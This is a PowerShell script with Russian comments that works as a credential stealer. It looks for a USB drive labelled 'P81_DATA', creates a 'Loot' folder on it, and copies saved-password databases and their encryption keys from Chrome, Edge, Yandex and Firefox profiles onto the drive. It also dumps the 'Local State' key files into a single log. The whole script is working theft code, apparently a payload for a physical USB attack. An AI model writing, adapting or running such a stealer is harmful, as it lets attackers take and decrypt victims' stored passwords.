# 1. Поиск флешки P81_DATA
$usb = Get-Volume | Where-Object { $_.FileSystemLabel -eq 'P81_DATA' } | Select-Object -ExpandProperty DriveLetter
if (!$usb) { exit }

# 2. Папка назначения
$time = Get-Date -Format "HH_mm_ss"
$dest = "$($usb):\Loot\$time"
New-Item -ItemType Directory -Path $dest -Force | Out-Null
$logFile = "$dest\ALL_KEYS_TEXT.log"

# 3. Сбор Chromium (Chrome, Edge, Yandex)
$browsers = @(
    @{n="CHROME"; p="Google\Chrome\User Data"},
    @{n="EDGE"; p="Microsoft\Edge\User Data"},
    @{n="YANDEX"; p="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $uPath = Join-Path $env:LOCALAPPDATA $b.p
    if (Test-Path $uPath) {
        $prefix = $b.n
        
        # Копируем файл Local State и записываем его содержимое в лог
        $lsPath = Join-Path $uPath "Local State"
        if (Test-Path $lsPath) {
            Copy-Item $lsPath -Destination "$dest\$($prefix)_LocalState" -Force
            
            # Добавляем содержимое файла в общий лог для удобства
            "--- START OF $($prefix) KEY ---" | Out-File -FilePath $logFile -Append
            Get-Content $lsPath -Raw | Out-File -FilePath $logFile -Append
            "--- END OF $($prefix) KEY ---`n" | Out-File -FilePath $logFile -Append
        }
        
        # Копируем базы паролей
        Get-ChildItem -Path $uPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
            $profile = $_.Directory.Name
            Copy-Item $_.FullName -Destination "$dest\$($prefix)_$($profile)_LoginData" -Force -ErrorAction SilentlyContinue
        }
    }
}

# 4. Сбор Firefox
$ffPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ffPath) {
    Get-ChildItem -Path $ffPath -Directory | ForEach-Object {
        $p = $_.FullName
        $n = $_.Name
        Copy-Item (Join-Path $p "logins.json") -Destination "$dest\FF_$($n)_logins.json" -ErrorAction SilentlyContinue
        Copy-Item (Join-Path $p "key4.db") -Destination "$dest\FF_$($n)_key4.db" -ErrorAction SilentlyContinue
    }
}

exit
